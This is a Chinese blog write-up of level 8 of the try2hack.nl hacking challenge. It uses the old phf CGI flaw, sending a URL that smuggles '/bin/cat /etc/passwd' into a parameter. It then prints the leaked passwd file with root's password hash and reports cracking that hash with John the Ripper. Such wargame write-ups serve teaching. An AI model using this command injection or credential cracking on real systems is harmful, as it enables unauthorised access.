--- 
layout: post
title: !binary |
  44CQ6Laj5ZGzSGFja+OAkVRyeTJoYWNrLm5s56ys5YWr5YWz4oCU4oCUcGhm
  5ryP5rSe5ZKM56C06KejTGludXjlr4bnoIE=

published: true
meta: 
  _edit_last: "1"
  _wp_old_slug: "%e3%80%90%e8%b6%a3%e5%91%b3hack%e3%80%91try2hack-nl%e7%ac%ac%e5%85%ab%e5%85%b3%e2%80%94%e2%80%94phf%e6%bc%8f%e6%b4%9e%e5%92%8c%e7%a0%b4%e8%a7%a3linux%e5%af%86%e7%a0%81"
tags: 
- !binary |
  Q0dJ5ryP5rSe

- Cracker
- Hack
- Linux
- Password
- phf-cgi
- !binary |
  6Laj5ZGzSGFjaw==

type: post
status: publish
---
第八关地址：

<a href="http://www.try2hack.nl/levels/level8-balnrg.xhtml">http://www.try2hack.nl/levels/level8-balnrg.xhtml</a>

a. 打开页面，可以看到是让你输入用户名和密码。检查html，javascript和报头，没有什么特殊的地方。

b. 随便输入一个用户名密码，可以看到会跳转到下面这个地址，显示“Sorry, the login information could not be verified.”
<pre escaped="true" lang="url" line="1">http://www.try2hack.nl/cgi-bin/phf</pre>
c. 看到结尾的phf有点奇怪，上网搜一下，发现有一个<a href="http://insecure.org/sploits/phf-cgi.html">漏洞</a>与这个有关系，机会来了，按照描述，输入下面的url
<pre escaped="true" lang="url" line="1">http://www.try2hack.nl/cgi-bin/phf?Qalias=x%0A/bin/cat%20/etc/passwd</pre>
d. 浏览器返回内容，看起来有点熟悉，结合url的格式，发现这个不是linux系统下的<a href="http://flash7783.javaeye.com/blog/583792">/etc/passwd</a>文件吗，上面的访问相当于执行了如下命令
<pre escaped="true" lang="bash" line="1">/bin/cat /etc/passwd</pre>
<pre escaped="true" lang="txt" line="1">root:khXGN7s.ldaJI:0:0::0:0:Charlie &amp;:/root:/usr/local/bin/bash
daemon:*:1:1::0:0:Owner of many system processes:/root:/sbin/nologin
operator:*:2:5::0:0:System Operator:/:/sbin/nologin
bin:*:3:7::0:0:Binaries Commands and Source:/:/sbin/nologin
tty:*:4:65533::0:0:Tty Sandbox:/:/sbin/nologin
kmem:*:5:65533::0:0:KMem Sandbox:/:/sbin/nologin
games:*:7:13::0:0:Games pseudo-user:/usr/games:/sbin/nologin
news:*:8:8::0:0:News Subsystem:/:/sbin/nologin
man:*:9:9::0:0:Mister Man Pages:/usr/share/man:/sbin/nologin
sshd:*:22:22::0:0:Secure Shell Daemon:/var/empty:/sbin/nologin
smmsp:*:25:25::0:0:Sendmail Submission User:/var/spool/clientmqueue:/sbin/nologin
mailnull:*:26:26::0:0:Sendmail Default User:/var/spool/mqueue:/sbin/nologin
bind:*:53:53::0:0:Bind Sandbox:/:/sbin/nologin
uucp:*:66:66::0:0:UUCP pseudo-user:/var/spool/uucppublic:/usr/libexec/uucp/uucico
xten:*:67:67::0:0:X-10 daemon:/usr/local/xten:/sbin/nologin
pop:*:68:6::0:0:Post Office Owner:/nonexistent:/sbin/nologin
www:*:80:80::0:0:World Wide Web Owner:/nonexistent:/sbin/nologin
nobody:*:65534:65534::0:0:Unprivileged user:/nonexistent:/sbin/nologin
root:khXGN7s.ldaJI:0:0::0:0:Charlie &amp;:/root:/usr/local/bin/bashdaemon:*:1:1::0:0:Owner of many system processes:/root:/sbin/nologinoperator:*:2:5::0:0:System Operator:/:/sbin/nologinbin:*:3:7::0:0:Binaries Commands and Source:/:/sbin/nologintty:*:4:65533::0:0:Tty Sandbox:/:/sbin/nologinkmem:*:5:65533::0:0:KMem Sandbox:/:/sbin/nologingames:*:7:13::0:0:Games pseudo-user:/usr/games:/sbin/nologinnews:*:8:8::0:0:News Subsystem:/:/sbin/nologinman:*:9:9::0:0:Mister Man Pages:/usr/share/man:/sbin/nologinsshd:*:22:22::0:0:Secure Shell Daemon:/var/empty:/sbin/nologinsmmsp:*:25:25::0:0:Sendmail Submission User:/var/spool/clientmqueue:/sbin/nologinmailnull:*:26:26::0:0:Sendmail Default User:/var/spool/mqueue:/sbin/nologinbind:*:53:53::0:0:Bind Sandbox:/:/sbin/nologinuucp:*:66:66::0:0:UUCP pseudo-user:/var/spool/uucppublic:/usr/libexec/uucp/uucicoxten:*:67:67::0:0:X-10 daemon:/usr/local/xten:/sbin/nologinpop:*:68:6::0:0:Post Office Owner:/nonexistent:/sbin/nologinwww:*:80:80::0:0:World Wide Web Owner:/nonexistent:/sbin/nologinnobody:*:65534:65534::0:0:Unprivileged user:/nonexistent:/sbin/nologin</pre>
e. 最终的答案会不会与这个有关系呢，其他行都没什么特殊，只有第一行比较特殊，而且密码没有进行Shadow安全密码服务。我们用经典的<a href="http://www.openwall.com/john/">John The Ripper Password Cracker</a>来解决这个问题，得到密码arse。

f. 输入用户名密码，拿到<a href="http://www.try2hack.nl/levels/level9-gnapei.xhtml">下一关</a>的入场劵。
